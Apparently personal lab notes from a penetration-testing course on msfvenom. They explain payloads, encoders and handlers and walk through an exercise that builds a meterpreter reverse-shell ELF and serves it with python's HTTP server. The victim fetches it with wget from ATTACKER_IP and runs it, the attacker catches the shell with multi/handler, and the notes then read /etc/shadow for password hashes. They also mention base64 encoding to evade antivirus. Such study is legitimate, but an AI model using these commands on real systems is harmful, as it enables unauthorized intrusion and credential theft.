
### What is msfvenom?
-------
Allows access to all payloads available in Metasploit framework
- Create payloads in different formats
- Create payloads for diff target systems

`msfvenom --list formats` - lists supported output formats.


**Encoders**
- Encode the payload
- Effective against some antivirus
- Learn methods to inject shell code is **more viable**
- **Example**: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`
	- PHP Version of Meterpreter was encoded in base64 and the output format was raw


**Handlers**
- Accept incoming connections generated by MSF venom payload
- **Catching a shell** -> Receive a connection from a target.
- `use exploit/muli/handler` to receive the incoming connection.


**Learn:**
- A reverse shell in the context of MSF venom, encoders, and handlers refers to a type of shell access where the **target machine initiates a connection back to the attackerâ€™s machine, giving the attacker remote control.**

**Linux Executable and Linkable Format (elf)**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`


**Note**: All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.


### Exercises
-------------------
- **Opened 3 Terminals**
	- (1) msfvenom
	- (2) attacker machine
	- (3) ssh into victim machine (murphy)

- Created a Linux meterpreter reverse_tcp payload using `msfvenom`
	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > shell.elf`\
	- Replace LHOST with with Attacker IP, LPORT with 4444 (Default)

- Create an HTTP Server to Serve the shell.elf
	- `python3 -m http.server 9000`
	- Listens on port 9000 for incoming connections

- **On Victim Terminal (machine)**
	- GET shell.elf
	- `wget http://ATTACKER_IP:9000/shell.elf`
	- chmod +777 shell.elf (grants permission to exec)
	- DO NOT RUN yet

- Open `msfconsole` on the 3rd Terminal
- use `exploit/multi/handler`
- This exploit defaults to a generic_reverse_tcp_shell
- We must match it to ours `linux/x86/meterpreter/reverse_tcp`
- Set LHOST and LPORT To our Attacker Configuration
- `run`
- Waiting for Connection 

- On VICTIM TERMINAL
	- ./shell.elf

- **Now,** we have a meterpreter shell on our attacker machine and can execute shell commands
- `cd /etc/
- `cat shadow (linux passwords`)
- ON WINDOWS (hashdump)

**Retrieve HASH of USER**
